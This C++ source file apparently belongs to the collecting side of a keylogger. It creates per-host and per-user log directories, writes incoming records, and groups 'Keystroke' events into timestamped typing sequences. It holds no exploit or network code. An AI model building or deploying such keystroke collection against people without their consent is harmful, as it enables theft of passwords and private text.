
#include "DataWriter.hpp"
#include "Parser.hpp"
#include "TimestampHandle.hpp"
#include <cstring>
#include <iostream>
#include <stdexcept>
#include <sys/stat.h>

void DataWriter::writeData(const std::string &host, const std::string &user,
                           const std::string &data) {
  tryInitDirectory(host);
  writeBasicData(host, user, data);
  writeTimeBasedSmartData(host, user, data);
}

void DataWriter::feedSequenceWriter(const std::string &host,
                                    const std::string &user,
                                    const std::string &data) {
  if (_sequenceData.find(host + user) == _sequenceData.end())
    resetSequenceData(host, user);

  Parser parser(data);
  if (parser._type != "Keystroke")
    return;
  if (_sequenceData[host + user]._startSequenceTime == 0)
    _sequenceData[host + user]._startSequenceTime =
        TimestampHandle::stringToTimestamp(parser._time);
  if (_sequenceData[host + user]._currentSequenceTime == 0)
    _sequenceData[host + user]._currentSequenceTime =
        TimestampHandle::stringToTimestamp(parser._time);
  if (_sequenceData[host + user]._currentSequenceTime + 1 >=
      TimestampHandle::stringToTimestamp(parser._time)) {
    _sequenceData[host + user]._sequence += ("+" + parser._input);
    _sequenceData[host + user]._currentSequenceTime =
        TimestampHandle::stringToTimestamp(parser._time);
  } else {
    _fileStreamsTimeSmart[host + user]
        << "Data sequence: Start at [" +
               TimestampHandle::timeStampToString(
                   _sequenceData[host + user]._startSequenceTime) +
               "] -- End at [" +
               TimestampHandle::timeStampToString(
                   _sequenceData[host + user]._currentSequenceTime) +
               "]\nSequence: " + _sequenceData[host + user]._sequence + "\n";
    resetSequenceData(host, user);
  }
}

void DataWriter::writeTimeBasedSmartData(const std::string &host,
                                         const std::string &user,
                                         const std::string &data) {
  auto it = _fileStreamsTimeSmart.find(host + user);
  if (it == _fileStreamsTimeSmart.end())
    _fileStreamsTimeSmart[host + user] =
        std::ofstream(_dataDir + "/" + host + "/" + user + "_TimeSmart.log");
  feedSequenceWriter(host, user, data);
}

void DataWriter::writeBasicData(const std::string &host,
                                const std::string &user,
                                const std::string &data) {
  auto it = _fileStreamsBasic.find(host + user);
  if (it == _fileStreamsBasic.end())
    _fileStreamsBasic[host + user] =
        std::ofstream(_dataDir + "/" + host + "/" + user + ".log");
  _fileStreamsBasic[host + user] << (data + '\n');
}

void DataWriter::tryInitDirectory(const std::string &host) const {
  if (mkdir(_dataDir.c_str(), S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH) == -1 &&
      errno != EEXIST)
    std::cerr << "cannot create host folder: " << std::strerror(errno)
              << std::endl;
  if (mkdir((_dataDir + "/" + host).c_str(),
            S_IRWXU | S_IRWXG | S_IROTH | S_IXOTH) == -1 &&
      errno != EEXIST) {
    std::cerr << "cannot create host folder: " << std::strerror(errno)
              << std::endl;
    throw std::runtime_error(strerror(errno));
  }
}

void DataWriter::resetSequenceData(const std::string &host,
                                   const std::string &user) {
  _sequenceData[host + user] = {0, 0, ""};
}
